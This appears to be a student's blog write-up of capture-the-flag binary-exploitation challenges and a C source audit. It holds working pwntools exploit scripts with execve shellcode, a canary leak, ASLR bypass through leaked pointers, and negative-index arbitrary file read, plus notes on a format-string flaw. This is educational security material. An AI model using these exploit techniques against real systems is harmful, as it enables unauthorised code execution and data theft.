<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Exploiting the use of improper fgets to grab a shell :)">
<meta property="og:type" content="article">
<meta property="og:title" content="So You Think Fgets is Safe?">
<meta property="og:url" content="http://atharvdamle.com/fgets-misuses/index.html">
<meta property="og:site_name" content="Atharv&#39;s Blog">
<meta property="og:description" content="Exploiting the use of improper fgets to grab a shell :)">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://atharvdamle.com/fgets-misuses/chal.jpg">
<meta property="article:published_time" content="2020-07-12T15:10:31.582Z">
<meta property="article:modified_time" content="2024-07-06T04:51:13.251Z">
<meta property="article:author" content="Atharv Damle">
<meta property="article:tag" content="Code">
<meta property="article:tag" content="Binary Exploitation">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://atharvdamle.com/fgets-misuses/chal.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>So You Think Fgets is Safe?</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/rop-n-pop/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/aslr/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/fgets-misuses/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/fgets-misuses/&text=So You Think Fgets is Safe?"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/fgets-misuses/&is_video=false&description=So You Think Fgets is Safe?"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=So You Think Fgets is Safe?&body=Check out this article: http://atharvdamle.com/fgets-misuses/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/fgets-misuses/&name=So You Think Fgets is Safe?&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/fgets-misuses/&t=So You Think Fgets is Safe?"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcrack"><span class="toc-number">1.</span> <span class="toc-text">Shellcrack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-dump2"><span class="toc-number">2.</span> <span class="toc-text">Stack-dump2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Image-viewer"><span class="toc-number">3.</span> <span class="toc-text">Image-viewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-Chal-jpg"><span class="toc-number">4.</span> <span class="toc-text">Reversing: Chal.jpg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code-Auditing-source-c"><span class="toc-number">5.</span> <span class="toc-text">Source Code Auditing: source.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        So You Think Fgets is Safe?
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Atharv Damle</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-12T15:10:31.582Z" itemprop="datePublished">2020-07-12</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Shellcrack"><a href="#Shellcrack" class="headerlink" title="Shellcrack"></a>Shellcrack</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p>This was a simple, “run your shellcode” challenge. Use the buffer overflow to overwrite the return address with the address of your buffer. Since the address of the buffer is given to you, this one was pretty easy.</p>
<p>If there was one issue, it would be that there’s a canary. But since it does not show up on <code>checksec</code>, it is a user made canary. The fun part is that the canary leaks itself, because the buffer is copied to 0x20 bytes after the start of the actual buffer, and printed from there, leaking the canary which is right after. Brilliant.</p>
<ol>
<li>Since the fread, accepts only 0x10 bytes, we put in some random characters + a newline</li>
<li>Read in the canary that was leaked</li>
<li>Put the shellcode in the buffer, then proceed to jump to it and execute to pop a shell</li>
<li><code>cat flag</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./shellcrack&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 5001)</span><br><span class="line"></span><br><span class="line">fread = b&#x27;\x90&#x27; * (0x10 - 1)</span><br><span class="line"></span><br><span class="line"># shell exec code lol</span><br><span class="line">payload = asm(&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">sub esp, 0x50</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push &#123;&#125;</span><br><span class="line">push &#123;&#125;</span><br><span class="line"></span><br><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">mov esi, 0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;.format(u32(&#x27;//sh&#x27;), u32(&#x27;/bin&#x27;)))</span><br><span class="line"></span><br><span class="line">padding = b&#x27;AAAABBBBC&#x27;</span><br><span class="line"></span><br><span class="line">p.readline()</span><br><span class="line">p.sendline(fread)</span><br><span class="line">p.readline()</span><br><span class="line"></span><br><span class="line">canary = p.readn(8)</span><br><span class="line"></span><br><span class="line">retPad = b&#x27;A&#x27; * 16</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;[&#x27;)</span><br><span class="line">buffer = int(p.readuntil(&#x27;]&#x27;, drop=True), 16)</span><br><span class="line">ret = p32(buffer)</span><br><span class="line">p.sendline(payload + padding + canary + retPad + ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Stack-dump2"><a href="#Stack-dump2" class="headerlink" title="Stack-dump2"></a>Stack-dump2</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p><em>stack-dump + aslr? ez</em></p>
<p>Thought this one would be harder. Building on the stack-dump from week 2, this time all I had to do extra was leak some addresses.</p>
<p>Although fgets is used, we specify the length, rendering it completely useless.</p>
<ol>
<li>Grab the pointer on the stack, it’s just one byte from the start of the buffer, so that’s great.</li>
<li>Dump the canary by reading memory from the start of the canary, which is <code>0x69</code> bytes from the useful pointer.</li>
<li>On reading the canary, the next step is finding where the <code>win</code> function is. We do that by leaking another address on the stack, this time from the code section. (Just in case the offsets for the code part and the stack are different)</li>
<li>Use the code pointer to find the address of the <code>win</code> function</li>
<li>Find the padding before and after the canary and overflow, to jump to the win function.</li>
<li><code>cat flag</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./stack-dump2&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 5002)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;useful stack pointer &#x27;)</span><br><span class="line">stackPointer = int(p.readuntil(&#x27;\n&#x27;, drop=True), 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.readuntil(&#x27;: &#x27;)</span><br><span class="line">p.sendline(&#x27;5&#x27;)</span><br><span class="line">p.sendline(p32(stackPointer + 0x69))</span><br><span class="line">p.sendline(&#x27;b&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;: &#x27;)</span><br><span class="line">canary = p.readn(4)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;quit&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;: &#x27;)</span><br><span class="line">p.sendline(&#x27;5&#x27;)</span><br><span class="line">p.sendline(p32(stackPointer + 0x3d))</span><br><span class="line">p.sendline(&#x27;b&#x27;)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;: &#x27;)</span><br><span class="line">codePointer = u32(p.readn(4))</span><br><span class="line"></span><br><span class="line">win = codePointer - 0x183b</span><br><span class="line"></span><br><span class="line">canaryPadding = b&#x27;A&#x27; * 0x60</span><br><span class="line">returnPadding = b&#x27;A&#x27; * 8</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;quit&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.readuntil(&#x27;: &#x27;)</span><br><span class="line">p.sendline(&#x27;113&#x27;)           # 0x60 + 4 + 8 + 4 + 1 (newline)</span><br><span class="line">p.sendline(canaryPadding + canary + returnPadding + p32(win))</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;quit&#x27;)</span><br><span class="line">p.readuntil(&#x27;quit&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;d&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Image-viewer"><a href="#Image-viewer" class="headerlink" title="Image-viewer"></a>Image-viewer</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p><em>The effect of an unchecked atoi can be so intense lol</em></p>
<p>This was a very interesting exploit. Since the buffer and the images array both are global variables, and the atoi is directly used to index into the array, it can be used to index into the buffer, using negative indices. Pretty cool. All you need to be careful is of byte alignment.</p>
<ol>
<li>First you need the index. I chose -2, but -1 would also work the same. Put this index at the start of the buffer, so you can pass that to atoi.</li>
<li>Choose your filename. The whole idea is that you can read any file you want, so choose the name, and put it right after the index (although it can be <em>mostly</em> anywhere in the buffer). Remember that the “blacklist” was for the exact file name, so it is easy to get around by simply supplying a relative path like <code>./flag</code> instead of <code>flag</code>.</li>
<li>Find the address of the filename string. In my case, it was <code>0x804c064</code>, although there was no need to worry about byte alignment for the filename.</li>
<li>Padding the buffer with a bunch of ‘a’s, the next thing on the list is memory management.</li>
<li>Make sure that the “entry” into the images array seems legitimate, we use the first 4 bytes to store the id, which based on the checks should be the same as the array index, -2 in this case. The next 4 bytes store the address to the filename. You need to worry about byte alignment for the index to be correct, so “allocating memory” for the images array from the end of the buffer is a great idea.</li>
<li>You can now leak any file you want :)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./image-viewer&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 5003)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;pls&#x27;)</span><br><span class="line">p.sendline(&#x27;trivial&#x27;)</span><br><span class="line"></span><br><span class="line"># checking byte alignment</span><br><span class="line">p.readuntil(&#x27;truth&#x27;)</span><br><span class="line">#filename = b&#x27;./flat earth truth\x00&#x27;</span><br><span class="line">filename = b&#x27;./flag\x00&#x27;</span><br><span class="line">p.sendline(b&#x27;-2&#x27; + b&#x27;AA&#x27; + filename + b&#x27;A&#x27; * (108 - len(filename)) + p32(0xfffffffe) + p32(0x804c064))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Reversing-Chal-jpg"><a href="#Reversing-Chal-jpg" class="headerlink" title="Reversing: Chal.jpg"></a>Reversing: Chal.jpg</h2><hr>
<img src="/fgets-misuses/chal.jpg" class="">

<p><em>The magic numbers really threw me off</em></p>
<p>My only thought when this compiled to something very close to the image was, “<em>Why is it that simple!?</em> “<br>So I looked into it a bit more. I believe here’s what the mod operation does (atleast in C)</p>
<ol>
<li>Use the “magic number”, in this case <code>0x2aaaaaab</code>, integer multiply with the sum of the two arguments.</li>
<li>Then get the top bit of the number. If the number is negative (top bit is 1), it would then subtract it from the product calculated in 1.</li>
<li>Now I call it the “magic number”, because somehow at this point it has the calculated the largest number that when multiplied by 6 (the number that the sum is modded by) gives the largest number less than the sum. For example, if <code>(arg1 + arg2) == 13</code> then the calculated number is <code>2</code>. And <code>2 * 6 == 12</code> is the largest multiple of <code>6</code> less than <code>13</code></li>
<li>The triple <code>add</code> instructions are simply multiplying the number calculated in (3) by <code>6</code>.</li>
<li>Then it subtracts the largest multiple from the sum and returns the remainder.</li>
<li>I also checked out odd number mods and that shifts the number to the right by <code>1</code> before shifting it back by <code>2</code>. hmmmmm</li>
<li>It also becomes very different when I optimize using the <code>-O2</code> flag.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int re_this(int arg1, int arg2) &#123;</span><br><span class="line">    return (arg1 + arg2) % 6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Source-Code-Auditing-source-c"><a href="#Source-Code-Auditing-source-c" class="headerlink" title="Source Code Auditing: source.c"></a>Source Code Auditing: source.c</h2><hr>
<a href="/fgets-misuses/source.c" title="source.c">source.c</a>

<p>There were <del>three</del> two and a half (??) vulnerabilites that were found in the source code.</p>
<p>The first one was a format string vulnerability on lines 142-146. Although <code>snprintf</code> is used, and a constant length is given to the function, the format is left to the user. Brilliant.</p>
<ol>
<li>This lets me dump the whole stack if I want into the syslog (which can be used through the next vulnerability) or write to anywhere in the program, (perhaps the GOT?) letting me gain some RCE :)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char log[MAX_LEN];</span><br><span class="line">snprintf(log, MAX_LEN,</span><br><span class="line">            &quot;SERVER: %d admin level, attempting command %x, args %s\n&quot;,</span><br><span class="line">            admin_level, action[0], action + 1);</span><br><span class="line">syslog(LOG_INFO, log);</span><br></pre></td></tr></table></figure>

<p>The next one was an overlook? but the <code>admin_level</code> is set to a default of <code>0</code> which means any user that connects to the server is automatically admin. GG.</p>
<ol>
<li>That essentially lets me run any commands on the server. If I can run another vulnerable program, maybe I can do a privilege escalation to get root privileges yay!</li>
<li>I could also use the vuln (1) to then send the dumped data from syslog over to my server for further exploitation of the server. (but I wouldn’t need to)</li>
</ol>
<p>The issue was on line 140:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint8_t admin_level = 0;</span><br></pre></td></tr></table></figure>

<p><strong><em>When the program is so broken that even the exploit doesn’t work</em></strong>.<br>This third one I thought was a vulnerability, but it is more a vulnerability in the making. The switch statement in the <code>SET_PERMISSION_LEVEL</code> sets the <code>admin_level</code>, which is an unsigned 8-bit integer to the value of <code>level</code>, which is a 32-bit integer.</p>
<ol>
<li>That would allow the user to easily overflow the value of <code>admin_level</code> to zero by setting <code>level</code> to a multiple of <code>256</code>.</li>
<li>However, this <strong>does not work in practice</strong> as the <code>sscanf</code> will never succeed in reading anything, because the first character of <code>action</code> array is never discarded by the program, nor does it allow the user to enter more characters. So if the user entered <code>U</code> to execute the <code>SET_PERMISSION_LEVEL</code> case, it wouldn’t be able to read in <code>U</code> into level, and it would set the <code>admin_level</code> to <code>-1</code>.</li>
<li>There is also no break statement after the <code>SET_PERMISSION_LEVEL</code> case, so if the command runner (<code>T</code>) was ever a blocked command, you could run it using (<code>U</code>) which should only set permissions, but not really.</li>
<li><strong>So while this is not a vulnerability right now, it will be one when the developer gets the <code>SET_PERMISSION_LEVEL</code> case to work as intended. Which is something to look out for</strong></li>
</ol>
<p>The broken code in question:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">uint8_t admin_level = 0;</span><br><span class="line">.</span><br><span class="line">. &lt;other code&gt;</span><br><span class="line">.</span><br><span class="line">case SET_PERMISSION_LEVEL: &#123;</span><br><span class="line">    int level = -1;</span><br><span class="line">    sscanf(action, &quot;%d&quot;, &amp;level);</span><br><span class="line">    // Don&#x27;t allow people to set themselves to admin.</span><br><span class="line">    if (level == 0) &#123;</span><br><span class="line">    continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    admin_level = level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr>
<p>This was an interesting week, because while the challenges were easier than last week in general, with the exception of <code>shellcrack</code> all the programs used <code>fgets</code> to run a buffer overflow instead of <code>gets</code>. It is important to make sure I don’t discard <code>fgets</code> as a point of attack in the future just because it is <code>fgets</code> and a length is passed in so there is no way that I can exploit it.<br>Nonetheless, was fun exploiting.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcrack"><span class="toc-number">1.</span> <span class="toc-text">Shellcrack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-dump2"><span class="toc-number">2.</span> <span class="toc-text">Stack-dump2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Image-viewer"><span class="toc-number">3.</span> <span class="toc-text">Image-viewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-Chal-jpg"><span class="toc-number">4.</span> <span class="toc-text">Reversing: Chal.jpg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source-Code-Auditing-source-c"><span class="toc-number">5.</span> <span class="toc-text">Source Code Auditing: source.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/fgets-misuses/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/fgets-misuses/&text=So You Think Fgets is Safe?"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/fgets-misuses/&is_video=false&description=So You Think Fgets is Safe?"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=So You Think Fgets is Safe?&body=Check out this article: http://atharvdamle.com/fgets-misuses/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/fgets-misuses/&title=So You Think Fgets is Safe?"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/fgets-misuses/&name=So You Think Fgets is Safe?&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/fgets-misuses/&t=So You Think Fgets is Safe?"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2024
    Atharv Damle
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
